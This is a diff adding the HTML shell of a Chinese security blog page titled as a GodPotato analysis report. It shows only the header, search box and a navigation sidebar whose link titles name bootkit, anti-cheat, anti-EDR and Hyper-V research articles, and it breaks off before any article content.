@@ -1,0 +1,5564 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../../BadPotato/BadPotato_analysis/">
+      
+      
+        <link rel="next" href="../../UACME/UACME_analysis/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>GodPotato 项目分析报告 - JRC BLOG</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../config/stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#godpotato" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../.." title="JRC BLOG" class="md-header__button md-logo" aria-label="JRC BLOG" data-md-component="logo">
+      
+  <img src="../../../../../config/logos/logo1.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            JRC BLOG
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              GodPotato 项目分析报告
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../.." title="JRC BLOG" class="md-nav__button md-logo" aria-label="JRC BLOG" data-md-component="logo">
+      
+  <img src="../../../../../config/logos/logo1.png" alt="logo">
+
+    </a>
+    JRC BLOG
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Welcome to crj blog
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    关于这个博客的主人
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows internel
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Windows internel
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    UEFI bootkit
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    UEFI bootkit
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_1" id="__nav_3_1_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Abyss 分析
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Abyss 分析
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_1_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_1_1" id="__nav_3_1_1_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dps 分析
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_1_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Dps 分析
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../UEFI%20bootkit/Abyss-%E5%88%86%E6%9E%90/dps-%E5%88%86%E6%9E%90/Abyss-UEFI-Bootkit-%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🦑 Abyss Windows UEFI Bootkit — 深度分析学习指南
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_1_2" id="__nav_3_1_1_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mimo 分析
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_1_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Mimo 分析
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../UEFI%20bootkit/Abyss-%E5%88%86%E6%9E%90/mimo-%E5%88%86%E6%9E%90/Abyss-UEFI-Bootkit-%E9%A1%B9%E7%9B%AE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Abyss Windows UEFI Bootkit — 项目分析与学习指南
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    antiCheats
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    antiCheats
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../antiCheats/Deobfuscation%20and%20Analysis%20of%20Ring-1.io/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Deobfuscation and Analysis of Ring 1.io
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../antiCheats/How%20Kernel%20Anti-Cheats%20Work%20-%20A%20Deep%20Dive%20into%20Modern%20Game%20Protection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    How Kernel Anti Cheats Work   A Deep Dive into Modern Game Protection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../antiCheats/Riot%20Games%20Vanguard/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Riot Games Vanguard
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../antiCheats/Static%20Analysis%20of%20BattlEye%27s%20Kernel%20Anti-Cheat%20Driver/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Static Analysis of BattlEye's Kernel Anti Cheat Driver
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../antiCheats/%E6%B0%B8%E6%9D%B0%E6%97%A0%E9%97%B4-NeacSafe64/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    永杰无间 NeacSafe64
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../antiCheats/%E7%9B%AE%E6%A0%87/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    目的：
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_7" id="__nav_3_2_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    hyperV 作弊
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    hyperV 作弊
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_7_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_7_1" id="__nav_3_2_7_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ScyVisor框架
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_7_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_7_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    ScyVisor框架
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../antiCheats/hyperV%20%E4%BD%9C%E5%BC%8A/ScyVisor%E6%A1%86%E6%9E%B6/%E8%83%8C%E6%99%AF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    背景
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    antiEDR
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    antiEDR
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../antiEDR/case%E9%9B%86%E5%90%88/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Case集合
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../antiEDR/stackspoofPOC%20-%20BYOUD/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    stackspoofPOC   BYOUD
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../antiEDR/stackspoof%E6%A3%80%E6%B5%8B%20-%20%E5%9F%BA%E4%BA%8E%E5%92%8Cshadow%E6%AF%94%E8%BE%83/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Stackspoof检测   基于和shadow比较
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../antiEDR/%E9%80%9A%E8%BF%87%E5%9F%BA%E4%BA%8E%E7%AD%96%E7%95%A5%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B4%A8%E9%87%8F%EF%BC%88QoS%EF%BC%89%E9%98%BB%E6%96%ADEDR%E9%80%9A%E4%BF%A1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    通过基于策略的服务质量（QoS）阻断EDR通信
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    hyperV
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    hyperV
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_1" id="__nav_3_4_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    学习路线
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    学习路线
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/GPT%E8%AF%B4%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GPT说学习路线
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/gpt%E5%90%88%E5%B9%B6%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Gpt合并的学习路线
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/qwen%E8%AF%B4%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔍 Hyper-V 漏洞案例资源索引（2023-2026）
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_2" id="__nav_3_4_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文章学习
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    文章学习
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0/Hyper-V%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%B4%A2%E5%BC%95/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hyper-V 基础知识索引
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0/Hyper-V%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E7%B4%A2%E5%BC%95/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hyper-V 安全研究索引
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0/hyper-v%20%E5%86%85%E9%83%A8%E5%8E%9F%E7%90%86/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hyper-V Internals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0/hyper-v-research/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hyper-V Research
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0/%E5%85%B3%E4%BA%8EHyper-V%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    关于Hyper-V的一些理解
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../hyperV/%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0/%E5%88%86%E6%9E%90%20hyper-v-research/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hyper-V Research 文章总结
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_2_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_2_7" id="__nav_3_4_2_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Misc
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_4_2_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_2_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Misc
+  
